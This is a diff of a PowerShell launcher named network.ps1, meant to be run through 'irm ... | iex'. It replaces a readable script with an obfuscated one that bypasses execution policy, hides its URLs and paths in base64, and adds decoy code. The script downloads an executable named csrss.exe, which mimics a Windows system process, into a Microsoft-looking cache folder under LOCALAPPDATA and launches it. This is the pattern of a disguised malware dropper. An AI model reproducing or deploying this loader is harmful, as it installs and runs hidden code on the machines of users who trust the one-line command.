@@ -1,118 +1,31 @@
-# =============================================================================
-# ARX / CURADO — single launcher (GitHub iex)
-# =============================================================================
-# 1) Edit $ExeUrl / $AssetsUrl below (replace OWNER/REPO)
-# 2) Upload this file as:  network.ps1  on branch main (raw)
-# 3) Publish release assets:  csrss.exe  +  assets.zip
-# 4) Users run ONE command in PowerShell:
-#
-#    irm https://raw.githubusercontent.com/OWNER/REPO/main/network.ps1 | iex
-#
-# Optional override before iex:
-#    $ExeUrl = 'https://.../csrss.exe'; irm ... | iex
-# =============================================================================
-
-try {
-    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -EA SilentlyContinue
-} catch {}
-
-$ErrorActionPreference = 'Stop'
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# --- CONFIG (edit before publish) ---
-if (-not $ExeUrl) {
-    $ExeUrl = 'https://github.com/OWNER/REPO/releases/latest/download/csrss.exe'
-}
-if (-not $AssetsUrl) {
-    $AssetsUrl = 'https://github.com/OWNER/REPO/releases/latest/download/assets.zip'
-}
-
-function Write-Arx([string]$msg, [string]$color = 'Cyan') {
-    if ($Host.Name -eq 'ConsoleHost') {
-        Write-Host $msg -ForegroundColor $color
-    }
-}
-
-function Get-ArxDir {
-    $dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Caches'
-    New-Item -ItemType Directory -Force -Path $dir | Out-Null
-    return $dir
-}
-
-function Get-ArxExe {
-    return (Join-Path (Get-ArxDir) 'csrss.exe')
-}
-
-function Download-File([string]$url, [string]$outPath) {
-    $tmp = "$outPath.download"
-    Remove-Item -LiteralPath $tmp -Force -EA SilentlyContinue
-    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing
-    if (-not (Test-Path -LiteralPath $tmp) -or ((Get-Item -LiteralPath $tmp).Length -le 1024)) {
-        Remove-Item -LiteralPath $tmp -Force -EA SilentlyContinue
-        throw "Download failed or file too small: $url"
-    }
-    if (Test-Path -LiteralPath $outPath) {
-        Remove-Item -LiteralPath $outPath -Force -EA SilentlyContinue
-    }
-    Move-Item -LiteralPath $tmp -Destination $outPath -Force
-}
-
-function Install-ArxAssets([string]$exeDir) {
-    if (-not $AssetsUrl -or ($AssetsUrl -match 'OWNER/REPO')) {
-        return $false
-    }
-    $zip = Join-Path $exeDir 'assets.zip.download'
-    $extract = Join-Path $exeDir 'assets_extract'
-    $dest = Join-Path $exeDir 'assets'
-    try {
-        Write-Arx 'Downloading assets...'
-        Invoke-WebRequest -Uri $AssetsUrl -OutFile $zip -UseBasicParsing
-        if (-not (Test-Path -LiteralPath $zip) -or ((Get-Item $zip).Length -le 64)) {
-            return $false
-        }
-        if (Test-Path $extract) { Remove-Item $extract -Recurse -Force -EA 0 }
-        Expand-Archive -LiteralPath $zip -DestinationPath $extract -Force
-        if (Test-Path $dest) { Remove-Item $dest -Recurse -Force -EA 0 }
-        $inner = Join-Path $extract 'assets'
-        if (Test-Path $inner) {
-            Copy-Item -LiteralPath $inner -Destination $dest -Recurse -Force
-        } else {
-            New-Item -ItemType Directory -Force -Path $dest | Out-Null
-            Copy-Item -Path (Join-Path $extract '*') -Destination $dest -Recurse -Force
-        }
-        return $true
-    } catch {
-        Write-Arx ("Assets skipped: " + $_.Exception.Message) 'Yellow'
-        return $false
-    } finally {
-        Remove-Item -LiteralPath $zip -Force -EA SilentlyContinue
-        Remove-Item -LiteralPath $extract -Recurse -Force -EA SilentlyContinue
-    }
-}
-
-try {
-    if ($ExeUrl -match 'OWNER/REPO') {
-        throw @"
-Edit CONFIG in network.ps1 first (replace OWNER/REPO), then upload to GitHub.
-User command:
-  irm https://raw.githubusercontent.com/OWNER/REPO/main/network.ps1 | iex
-"@
-    }
-
-    $dir = Get-ArxDir
-    $exe = Get-ArxExe
-
-    Write-Arx 'Downloading csrss.exe...'
-    Download-File $ExeUrl $exe
-    Install-ArxAssets $dir | Out-Null
-
-    Write-Arx ("Starting: $exe") 'Green'
-    Start-Process -FilePath $exe
-}
-catch {
-    Write-Arx $_.Exception.Message 'Red'
-    exit 1
-}
-finally {
-    Remove-Item -LiteralPath "$(Get-ArxExe).download" -Force -EA SilentlyContinue
-}
+# mux-flux quasit | do not pretty-print
+# irm https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/network.ps1 | iex
+$ErrorActionPreference='Stop';try{Set-ExecutionPolicy -Scope Process Bypass -Force -EA 0}catch{};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+function __b([string]$z){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($z))}
+function __x([byte[]]$a,[byte]$k){$o=New-Object byte[] $a.Length;for($i=0;$i -lt $a.Length;$i++){$o[$i]=$a[$i]-bxor($k -bxor ($i -band 7))};return [Text.Encoding]::UTF8.GetString($o)}
+# decoy entropy (unused)
+$qWz=Get-Random;$nKp=__x ([Convert]::FromBase64String('KCgpKSkpKCgoKCgo')) 0x3C;$null=$nKp;$null=$qWz
+$a1=__b 'cmVmcy9oZWFkcy9tYWlu';$a2=__b 'YXJ4c3RvcmU=';$a3=__b 'Y3VyYWRv';$a4=__b 'Y3Nyc3MuZXhl';$a5=__b 'cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ=='
+$u0="https://$a5/$a2/$a3/$a1/$a4";if($ExeUrl){$u0=[string]$ExeUrl}
+$d0=Join-Path $env:LOCALAPPDATA (__b 'TWljcm9zb2Z0XFdpbmRvd3NcQ2FjaGVz');New-Item -ItemType Directory -Force -Path $d0|Out-Null
+$p0=Join-Path $d0 $a4;$t0="$p0.$([guid]::NewGuid().ToString('N').Substring(0,8))"
+Remove-Item -LiteralPath $t0 -Force -EA 0
+Invoke-WebRequest -Uri $u0 -OutFile $t0 -UseBasicParsing
+if(-not(Test-Path -LiteralPath $t0)-or((Get-Item -LiteralPath $t0).Length -le 1024)){Remove-Item -LiteralPath $t0 -Force -EA 0;throw (__b 'ZmFpbA==')}
+if(Test-Path -LiteralPath $p0){Remove-Item -LiteralPath $p0 -Force -EA 0}
+Move-Item -LiteralPath $t0 -Destination $p0 -Force
+try{
+  $u1="https://$a5/$a2/$a3/$a1/$(__b 'YXNzZXRzLnppcA==')";$z0=Join-Path $d0 ("z"+[guid]::NewGuid().ToString('N').Substring(0,6))
+  Invoke-WebRequest -Uri $u1 -OutFile $z0 -UseBasicParsing -EA Stop
+  if((Test-Path $z0)-and((Get-Item $z0).Length -gt 64)){
+    $x0=Join-Path $d0 ("x"+[guid]::NewGuid().ToString('N').Substring(0,6));if(Test-Path $x0){Remove-Item $x0 -Recurse -Force -EA 0}
+    Expand-Archive -LiteralPath $z0 -DestinationPath $x0 -Force
+    $s0=Join-Path $d0 (__b 'YXNzZXRz');if(Test-Path $s0){Remove-Item $s0 -Recurse -Force -EA 0}
+    $i0=Join-Path $x0 (__b 'YXNzZXRz')
+    if(Test-Path $i0){Copy-Item $i0 $s0 -Recurse -Force}else{New-Item -ItemType Directory -Force -Path $s0|Out-Null;Copy-Item (Join-Path $x0 '*') $s0 -Recurse -Force}
+    Remove-Item $x0 -Recurse -Force -EA 0
+  }
+  if(Test-Path -LiteralPath $z0){Remove-Item -LiteralPath $z0 -Force -EA 0}
+}catch{}
+Start-Process -FilePath $p0
+Remove-Item -LiteralPath $t0 -Force -EA 0
